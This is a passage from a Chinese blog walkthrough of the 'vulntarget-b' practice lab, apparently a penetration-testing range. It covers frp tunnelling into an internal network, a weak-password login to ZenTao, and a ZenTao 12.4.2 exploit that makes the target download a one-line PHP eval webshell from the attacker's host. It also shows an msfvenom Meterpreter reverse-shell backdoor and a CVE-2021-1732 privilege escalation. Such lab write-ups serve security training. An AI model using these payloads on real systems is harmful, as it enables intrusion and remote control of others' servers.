+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640761374/Xnip2021-12-29_15-02-43_gsagsp.png"></p>
+<p>frpc 配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.189.133</span><br><span class="line">server_port = 7777</span><br><span class="line"></span><br><span class="line">[socks_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 8888</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p>启动 frpc （这里普通用户也有权限启动，不需要 root）</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640761346/Xnip2021-12-29_15-01-40_pihhyu.png"></p>
+<p>Chrome 配置代理</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640761444/Xnip2021-12-29_15-03-53_asqldx.png"></p>
+<h3 id="内网禅道弱口令"><a href="#内网禅道弱口令" class="headerlink" title="内网禅道弱口令"></a>内网禅道弱口令</h3><p>成功访问到内网禅道</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640761591/Xnip2021-12-29_15-05-56_te9u2b.png"></p>
+<p>burp 测一波弱口令</p>
+<p>给 burp 设置 socks 代理</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640763789/Xnip2021-12-29_15-39-23_s8sbm1.png"></p>
+<p>emmmm 密码加密传输的，不是 md5，手动弱口令吧</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640763790/Xnip2021-12-29_15-42-37_wyb0yr.png"></p>
+<p>使用 admin&#x2F;Admin123 成功进入后台</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640763864/Xnip2021-12-29_15-44-15_izo19c.png"></p>
+<h3 id="禅道-getshell"><a href="#禅道-getshell" class="headerlink" title="禅道 getshell"></a>禅道 getshell</h3><p>禅道版本为版本 12.4.2，去谷歌搜索一下，发现此版本存在漏洞，可以直接 getshell</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833078/Xnip2021-12-30_10-34-39_t7fehg.png"></p>
+<blockquote>
+<p>禅道 12.4.2 版本存在任意文件下载漏洞，该漏洞是因为 client 类中 download 方法中过滤不严谨可以使用 ftp 达成下载文件的目的。且下载文件存储目录可解析 php 文件，造成 getshell</p>
+<p>禅道 OA 12.4.2 中，因为 download 中的 downloadZipPackage 函数过滤不严谨，可以使用 ftp，HTTP 协议等绕过</p>
+<p>具体可参考 <a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/146782.html">https://www.secpulse.com/archives/146782.html</a></p>
+</blockquote>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>我们控制的那台 linux 是有 python 的，使用 python 开启一个简单的 web 服务，以便目标能访问并下载我们的 webshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <span class="comment"># 使用python pty模块开启一个交互式shell环境</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833165/Xnip2021-12-30_10-59-17_hgfnyp.png"></p>
+<p>由于禅道这台服务器不出网，因此只能利用第一层的 linux 这台服务器来下载 webshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_REQUEST[&#x27;x&#x27;]); ?&gt; &quot;</span> &gt; backdoor.php  <span class="comment">#写一个一句话webshell</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8989 <span class="comment">#使用python开启一个简单的web服务</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833323/Xnip2021-12-30_11-01-48_yegdxn.png"></p>
+<p>攻击 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://192.168.112.129:8989/backdoor.php</span><br></pre></td></tr></table></figure>
+
+<p>使用 base64 加密一次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SFRUUDovLzE5Mi4xNjguMTEyLjEyOTo4OTg5L2JhY2tkb29yLnBocA==</span><br></pre></td></tr></table></figure>
+
+<p>完整 exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.112.128:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzE5Mi4xNjguMTEyLjEyOTo4OTg5L2JhY2tkb29yLnBocA==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833670/Xnip2021-12-30_11-06-06_kmihww.png"></p>
+<p>提示保存成功，访问一下 backdoor.php，文件存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.112.128:8080/data/client/1/backdoor.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833670/Xnip2021-12-30_11-07-41_njugrw.png"></p>
+<p>蚁剑配置代理连接</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833835/Xnip2021-12-30_11-09-45_qv9jli.png"></p>
+<p>是个低权限用户 iis apppool\zentao</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640833836/Xnip2021-12-30_11-10-12_jze7eb.png"></p>
+<p>上线 MSF</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.112.129 lport=6767 -f exe &gt; /root/msfshell/backdoor.exe  <span class="comment">#生成windows后门</span></span><br></pre></td></tr></table></figure>
+
+<p>设置监听，通过蚁剑上传后门文件执行获得会话</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640851677/Xnip2021-12-30_16-06-44_ztt91g.png"></p>
+<p>添加路由，权限很低</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640851817/Xnip2021-12-30_16-09-38_yeiy5y.png"></p>
+<p>使用 msf 提权建议模块尝试提权无果，手动查找可用提权 exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>
+
+<p>查一下补丁状况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
+<p>windows 10 专业版</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640854894/Xnip2021-12-30_16-25-30_zjlac0.png"></p>
+<p>提权辅助查询一下可用 exp，CVE-2021-1732 可用</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640855018/Xnip2021-12-30_17-03-10_uyiasu.png"></p>
+<p>msf 提权成功</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640854896/Xnip2021-12-30_17-00-04_v4x1k9.png"></p>
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1640855302/Xnip2021-12-30_17-08-12_iqafva.png"></p>
+<p>msf 会话一直掉，有时间再更。。。。。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.</span> <span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E2%80%94-%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">信息收集 — 外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8888-%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.</span> <span class="toc-text">8888 端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80-%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.</span> <span class="toc-text">80 端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#81-%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.3.</span> <span class="toc-text">81 端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS-%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">3.</span> <span class="toc-text">CMS 后台地址泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%8D%E7%94%A8-amp-%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">验证码复用 &amp; 后台弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%8F%92%E4%BB%B6-getshell"><span class="toc-number">5.</span> <span class="toc-text">后台插件 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-disable-functions"><span class="toc-number">6.</span> <span class="toc-text">绕过 disable_functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">8.</span> <span class="toc-text">内网横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#frp-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">8.1.</span> <span class="toc-text">frp 内网穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A6%85%E9%81%93%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">8.2.</span> <span class="toc-text">内网禅道弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%85%E9%81%93-getshell"><span class="toc-number">8.3.</span> <span class="toc-text">禅道 getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">9.1.</span> <span class="toc-text">域内信息收集</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/12/28/vulntarget-b/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/12/28/vulntarget-b/&text=vulntarget-b 靶场"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/12/28/vulntarget-b/&is_video=false&description=vulntarget-b 靶场"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulntarget-b 靶场&body=Check out this article: http://example.com/2021/12/28/vulntarget-b/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/12/28/vulntarget-b/&title=vulntarget-b 靶场"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/12/28/vulntarget-b/&name=vulntarget-b 靶场&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/12/28/vulntarget-b/&t=vulntarget-b 靶场"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
